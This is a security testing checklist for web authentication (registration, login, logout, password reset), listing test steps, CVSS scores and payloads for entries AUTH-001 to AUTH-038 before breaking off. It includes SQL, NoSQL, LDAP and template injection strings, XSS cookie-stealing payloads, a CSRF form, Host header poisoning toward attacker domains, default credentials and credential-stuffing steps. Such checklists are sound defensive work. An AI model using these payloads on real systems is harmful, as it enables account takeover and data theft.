# 1. Authentication & User Management — Checklist

Feature-area security **test cases** for “1. Authentication & User Management”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*102 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## AUTH-001 — SQL Injection in Registration Form
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Navigate to signup page 2. Enter SQL payload in username/email fields 3. Submit form 4. Observe response and database behavior

**Expected Result:** Application should sanitize input and reject malicious payloads without SQL error disclosure

**Payload Example:**

```
' OR 1=1--; admin'--; ' UNION SELECT null,null,null--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite / OWASP ZAP

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AUTH-002 — XSS in Registration Fields
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Navigate to signup page 2. Enter XSS payload in name/username fields 3. Submit form 4. View profile or admin panel to check if script executes

**Expected Result:** Application should encode/escape output and not execute injected scripts

**Payload Example:**

```
<script>alert('XSS')</script>|<img src=x onerror=alert(1)>|"><svg/onload=alert(document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSStrike / Dalfox

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## AUTH-003 — Email Validation Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Submit registration with invalid email formats 2. Try emails without @ symbol 3. Try emails with special chars 4. Try very long email strings

**Expected Result:** Application should validate email format on both client and server side

**Payload Example:**

```
test@|test@@domain.com|test@.com|a@b|user@domain..com
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## AUTH-004 — Duplicate Registration Check
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Register with valid email 2. Try registering again with same email 3. Try same email with different case 4. Check response differences

**Expected Result:** Application should prevent duplicate accounts and return consistent error messages

**Payload Example:**

```
email: user@test.com (register twice)|User@Test.com
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## AUTH-005 — Weak Password Acceptance
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Try registering with common weak passwords 2. Try passwords without complexity 3. Try passwords shorter than minimum length 4. Try dictionary words

**Expected Result:** Application should enforce strong password policy (min 8 chars uppercase lowercase number special char)

**Payload Example:**

```
123456|password|qwerty|abc|aaaa|Password1
```

**Impact:** Weak password policy -&gt; trivial brute force / credential-stuffing success -&gt; ATO.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-521; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-07; NIST 800-63B

---

## AUTH-006 — Username Enumeration via Registration
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Register with existing username/email 2. Register with non-existing username/email 3. Compare response messages response times and HTTP status codes

**Expected Result:** Application should return generic messages that do not reveal whether an account exists

**Payload Example:**

```
existing@email.com vs nonexisting@email.com
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite / ffuf / Wfuzz

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## AUTH-007 — Race Condition in Registration
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Capture signup request 2. Send multiple identical signup requests simultaneously using Turbo Intruder 3. Check if multiple accounts are created

**Expected Result:** Application should handle concurrent requests and create only one account

**Payload Example:**

```
Send 50 concurrent POST /signup requests with same data
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Burp Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## AUTH-008 — Registration Bombardment/Spam
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Automate registration form submission 2. Submit hundreds of registrations rapidly 3. Check if rate limiting exists

**Expected Result:** Application should implement rate limiting and CAPTCHA to prevent automated registrations

**Payload Example:**

```
Automated POST /api/register with random data in loop
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Intruder / Custom Scripts / JMeter

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AUTH-009 — CAPTCHA Bypass on Registration
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Capture registration request with valid CAPTCHA 2. Replay the request with same CAPTCHA token 3. Remove CAPTCHA parameter entirely 4. Try empty CAPTCHA value

**Expected Result:** CAPTCHA should be validated server-side and single-use

**Payload Example:**

```
Remove captcha_token parameter|Set captcha=empty|Replay old captcha
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AUTH-010 — Mass Assignment/Parameter Pollution in Registration
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Capture signup request 2. Add additional parameters like role=admin or isAdmin=true or isVerified=true 3. Submit modified request

**Expected Result:** Application should whitelist allowed parameters and ignore unauthorized fields

**Payload Example:**

```
{"username":"test"|email:"t@t.com"|role:"admin"|isAdmin:true|isVerified:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## AUTH-011 — CSRF on Registration Form
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Create a malicious HTML page with auto-submitting form to registration endpoint 2. Host the page 3. Trick victim into visiting

**Expected Result:** Application should implement anti-CSRF tokens on registration form

**Payload Example:**

```
<form action='https://target/signup' method='POST'><input name='email' value='attacker@evil.com'></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## AUTH-012 — Server-Side Template Injection in Registration
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Enter SSTI payload in name/username fields during registration 2. Check if template engine processes the input 3. Observe confirmation emails or profile pages

**Expected Result:** Application should not process template expressions from user input

**Payload Example:**

```
{{7*7}}|${7*7}|<%= 7*7 %>|#{7*7}|${{7*7}}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## AUTH-013 — LDAP Injection in Registration
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. If LDAP backend is used for registration 2. Enter LDAP injection payloads in username field 3. Observe authentication behavior

**Expected Result:** Application should sanitize LDAP special characters

**Payload Example:**

```
*|*)(cn=*))(|(cn=*|admin)(&)|*()|&
```

**Impact:** LDAP filter injection -&gt; authentication bypass / directory data disclosure.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## AUTH-014 — Host Header Injection on Registration
**Test Category:** Host Header Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SignUp - Registration form: username / email / name / password + hidden params

**Test Steps:** 1. Capture registration request 2. Modify Host header to attacker domain 3. Check if confirmation email contains attacker domain link

**Expected Result:** Application should not use Host header to generate links in emails

**Payload Example:**

```
Host: evil.com|X-Forwarded-Host: evil.com
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## AUTH-015 — Brute Force Attack on Login
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Capture login request 2. Use Burp Intruder with common password wordlist 3. Monitor responses for successful login indicators 4. Check if account lockout triggers

**Expected Result:** Application should implement account lockout and rate limiting after failed attempts

**Payload Example:**

```
Use rockyou.txt or SecLists common passwords wordlist
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Intruder / Hydra / Medusa / ffuf

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-016 — Credential Stuffing Attack
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Obtain leaked credential databases 2. Automate login attempts with known email/password combinations 3. Check for successful authentications

**Expected Result:** Application should detect and block credential stuffing with rate limiting and anomaly detection

**Payload Example:**

```
Use known breach databases with email:password combinations
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Sentry MBA / Custom Scripts / Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-017 — SQL Injection in Login
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Enter SQL injection payloads in username and password fields 2. Try authentication bypass payloads 3. Monitor for SQL errors or successful bypass

**Expected Result:** Application should use parameterized queries and not be vulnerable to SQL injection

**Payload Example:**

```
admin' OR '1'='1|' OR 1=1--|admin'--|' UNION SELECT 1,'admin','password'--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite / Havij

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AUTH-018 — NoSQL Injection in Login
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Change Content-Type to application/json 2. Inject NoSQL operators in login fields 3. Check for authentication bypass

**Expected Result:** Application should validate input types and not be vulnerable to NoSQL injection

**Payload Example:**

```
{"username":{"$gt":""}password:{"$gt":""}}|{"username":{"$ne":""}password:{"$ne":""}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** Burp Suite / NoSQLMap

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## AUTH-019 — Default Credentials Check
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Try common default credential combinations 2. Test admin/admin admin/password root/root 3. Check documentation for default accounts

**Expected Result:** Application should not have default credentials and force password change on first login

**Payload Example:**

```
admin:admin|admin:password|root:root|test:test|administrator:administrator
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Hydra / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-020 — Username Enumeration via Login
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Submit login with valid username invalid password 2. Submit login with invalid username 3. Compare error messages response times and status codes

**Expected Result:** Application should return identical generic error messages regardless of whether username exists

**Payload Example:**

```
Valid user: 'Invalid password' vs Invalid user: 'User not found' (timing difference)
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite / ffuf / Wfuzz

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## AUTH-021 — Login over HTTP (Insecure Transport)
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Check if login page is served over HTTPS 2. Check if credentials are submitted over HTTPS 3. Check for HTTP to HTTPS redirect 4. Check HSTS header

**Expected Result:** All authentication traffic should be encrypted via HTTPS with HSTS enabled

**Payload Example:**

```
Navigate to http://target.com/login and check if redirect occurs
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** Burp Suite / SSLscan / testssl.sh

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## AUTH-022 — Insufficient Anti-Automation on Login
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Send rapid automated login requests 2. Check if CAPTCHA appears after failed attempts 3. Check response time consistency 4. Try IP rotation

**Expected Result:** Application should implement progressive delays CAPTCHA and rate limiting

**Payload Example:**

```
Automated POST /login requests 100 per minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Intruder / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AUTH-023 — Session Fixation on Login
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Obtain session ID before login 2. Login with valid credentials 3. Check if session ID changes after successful login

**Expected Result:** Application should generate new session ID upon successful authentication

**Payload Example:**

```
Compare Set-Cookie before and after login
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## AUTH-024 — Login Response Manipulation
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Login with invalid credentials 2. Intercept response 3. Modify response body (change false to true or error to success) 4. Forward modified response

**Expected Result:** Application should validate authentication server-side not rely on client-side response checking

**Payload Example:**

```
Change {"success":false} to {"success":true}|Change 401 to 200
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Response Modification

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-025 — Multi-Factor Authentication Bypass on Login
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Complete first factor authentication 2. Skip MFA step by directly accessing post-login URLs 3. Try manipulating MFA response 4. Brute force OTP

**Expected Result:** Application should enforce MFA before granting access to any authenticated resource

**Payload Example:**

```
Direct access to /dashboard after first factor|Brute force 4-6 digit OTP
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-026 — Account Lockout Testing
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Login - Login form: username / password fields, session cookie

**Test Steps:** 1. Submit multiple failed login attempts (10-20) 2. Check if account gets locked 3. Check lockout duration 4. Try login from different IP after lockout

**Expected Result:** Account should lock after 3-5 failed attempts with increasing lockout duration and admin notification

**Payload Example:**

```
Submit 20 failed login attempts rapidly
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Intruder / Hydra

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-027 — Session Not Invalidated After Logout
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Logout - Logout endpoint + session/cookie lifecycle

**Test Steps:** 1. Login and capture session token 2. Logout 3. Use captured session token to access protected resources 4. Check if token still works

**Expected Result:** Session token should be completely invalidated server-side upon logout

**Payload Example:**

```
Replay Authorization: Bearer <old_token> after logout
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-028 — Incomplete Logout (Multiple Tabs)
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Logout - Logout endpoint + session/cookie lifecycle

**Test Steps:** 1. Login and open application in multiple tabs 2. Logout from one tab 3. Try accessing resources from other tabs 4. Refresh other tabs

**Expected Result:** Logout should invalidate session across all tabs and devices

**Payload Example:**

```
Access /api/profile from second tab after logout in first tab
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Browser / Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-029 — Back Button After Logout
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Logout - Logout endpoint + session/cookie lifecycle

**Test Steps:** 1. Login and navigate to sensitive pages 2. Logout 3. Press browser back button 4. Check if cached pages with sensitive data are displayed

**Expected Result:** Application should use proper cache-control headers to prevent cached page access after logout

**Payload Example:**

```
Cache-Control: no-cache no-store must-revalidate|Pragma: no-cache
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Browser / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-030 — CSRF on Logout
**Test Category:** Cross-Site Request Forgery · **Severity:** Low · **CVSS:** 3.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Logout - Logout endpoint + session/cookie lifecycle

**Test Steps:** 1. Create malicious page with auto-submit form/request to logout endpoint 2. Trick authenticated user into visiting 3. Check if user gets logged out

**Expected Result:** Application should require CSRF token for logout to prevent forced logout attacks

**Payload Example:**

```
<img src='https://target.com/api/logout'>|Auto-submit form to /logout
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## AUTH-031 — Cross-Device Session Termination
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Logout - Logout endpoint + session/cookie lifecycle

**Test Steps:** 1. Login from Device A and Device B 2. Logout from Device A 3. Check if session on Device B is still active 4. Test 'Logout all devices' feature

**Expected Result:** Application should provide option to terminate sessions on all devices

**Payload Example:**

```
Login from browser and mobile then logout from one
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Multiple Devices / Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-032 — Username Enumeration via Password Reset
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Forgot Password - Password-reset flow: email field, reset token, Host header

**Test Steps:** 1. Request password reset with valid email 2. Request with invalid email 3. Compare response messages and timing 4. Check for different HTTP status codes

**Expected Result:** Application should return same generic response regardless of email existence

**Payload Example:**

```
Valid: 'Reset link sent' vs Invalid: 'Email not found' (should be identical)
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## AUTH-033 — Password Reset Token Predictability
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Forgot Password - Password-reset flow: email field, reset token, Host header

**Test Steps:** 1. Request multiple password reset tokens 2. Analyze token patterns and entropy 3. Check if tokens are sequential or time-based 4. Attempt to predict next token

**Expected Result:** Reset tokens should be cryptographically random with high entropy (minimum 128 bits)

**Payload Example:**

```
Collect 100 tokens and analyze with Burp Sequencer
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Sequencer / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-034 — Password Reset Token Not Expiring
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Forgot Password - Password-reset flow: email field, reset token, Host header

**Test Steps:** 1. Request password reset link 2. Wait beyond expected expiry time (15-60 min) 3. Use the old reset link 4. Check if it still works

**Expected Result:** Reset tokens should expire within 15-60 minutes maximum

**Payload Example:**

```
Use reset link after 2 hours|Use reset link after 24 hours
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-035 — Password Reset Token Reuse
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Forgot Password - Password-reset flow: email field, reset token, Host header

**Test Steps:** 1. Request password reset 2. Use token to reset password 3. Try using the same token again to reset password again

**Expected Result:** Reset token should be single-use and invalidated after first use

**Payload Example:**

```
Replay POST /reset-password with same token after successful reset
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-036 — Password Reset Poisoning via Host Header
**Test Category:** Host Header Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Forgot Password - Password-reset flow: email field, reset token, Host header

**Test Steps:** 1. Request password reset for victim email 2. Intercept request and change Host header to attacker domain 3. If victim clicks link the token goes to attacker

**Expected Result:** Application should not use Host header to construct reset URLs

**Payload Example:**

```
Host: attacker.com|X-Forwarded-Host: attacker.com|X-Host: attacker.com
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## AUTH-037 — Password Reset Link Sent Over HTTP
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Forgot Password - Password-reset flow: email field, reset token, Host header

**Test Steps:** 1. Request password reset 2. Check email for reset link 3. Verify if link uses HTTPS 4. Check if token is in URL parameters (potential referer leak)

**Expected Result:** Reset links should use HTTPS and tokens should not leak via Referer header

**Payload Example:**

```
Check if link is http://target.com/reset?token=xxx vs https://
```

**Impact:** Credentials/tokens over cleartext -&gt; network interception -&gt; account takeover.

**Tools:** Email Client / Burp Suite

**References:** CWE-319; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-01

---

## AUTH-038 — Account Takeover via Password Reset
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Forgot Password - Password-reset flow: email field, reset token, Host header

**Test Steps:** 1. Request reset for your account 2. Intercept request 3. Change email parameter to victim email but keep your reset token 4. Try IDOR on reset endpoint

**Expected Result:** Password reset should be bound to specific email/user and validated server-side

**Payload Example:**

```
Change email=victim@test.com in reset POST request|Modify user_id parameter
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Manual Testing

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AUTH-039 — Rate Limiting on Password Reset
